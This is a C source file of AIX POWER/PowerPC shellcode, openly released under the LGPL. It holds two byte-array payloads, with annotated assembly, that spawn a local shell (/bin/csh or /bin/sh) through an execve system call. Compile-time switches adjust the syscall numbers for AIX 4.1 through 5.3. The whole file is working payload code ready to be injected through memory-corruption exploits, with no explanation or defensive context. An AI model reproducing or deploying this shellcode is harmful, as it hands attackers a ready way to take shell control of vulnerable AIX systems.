/*
 *  $Id: aix-power-shellcode.c 6 2008-09-10 17:27:50Z ramon $
 *
 *  aix-power-shellcode.c - AIX POWER/PowerPC shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Currently supported AIX versions.
 * -DV41    AIX 4.1
 * -DV42    AIX 4.2
 * -DV43    AIX 4.3
 * -DV4330  AIX 4.3.3.0
 * -DV53    AIX 5.3
 *
 */

#ifndef ALT
char shellcode[]=           /*  56 bytes                          */
    "\x3b\xe0\x01\xff"      /*  lil     r31,511                   */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xf9"      /*  bnel    <shellcode>               */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
    "\x38\x7e\xfe\x25"      /*  cal     r3,-475(r30)              */
    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
    "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
#if defined(V41) || defined(V4330)
    "\x38\x5f\xfe\x04"      /*  cal     r2,-508(r31)              */
#endif
#ifdef V42
    "\x38\x5f\xfe\x03"      /*  cal     r2,-509(r31)              */
#endif
#ifdef V43
    "\x38\x5f\xfe\x05"      /*  cal     r2,-507(r31)              */
#endif
#ifdef V53
    "\x38\x42\xfe\x06"      /*  cal     r2,-506(r2)               */
#endif
    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
    "/bin/csh"
;

#else
char shellcode[]=           /*  64 bytes                          */
    "\x7c\xa5\x2a\x78"      /*  xor     r5,r5,r5                  */
    "\x3f\xe0\x2f\x63"      /*  liu     r31,12131                 */
    "\x63\xff\x73\x68"      /*  oril    r31,r31,29544             */
    "\x3f\xc0\x2f\x62"      /*  liu     r30,12130                 */
    "\x63\xde\x69\x6e"      /*  oril    r30,r30,26990             */
    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
    "\x97\xe1\xff\xfc"      /*  stu     r31,-4(r1)                */
    "\x97\xc1\xff\xfc"      /*  stu     r30,-4(r1)                */
    "\x7c\x23\x0b\x78"      /*  mr      r3,r1                     */
    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
    "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
    "\x38\x40\x01\xff"      /*  lil     r2,511                    */
#if defined(V41) || defined(V4330)
    "\x38\x42\xfe\x04"      /*  cal     r2,-508(r2)               */
#endif
#ifdef V42
    "\x38\x42\xfe\x03"      /*  cal     r2,-509(r2)               */
#endif
#ifdef V43
    "\x38\x42\xfe\x05"      /*  cal     r2,-507(r2)               */
#endif
#ifdef V53
    "\x38\x42\xfe\x06"      /*  cal     r2,-506(r2)               */
#endif
    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
;

#endif

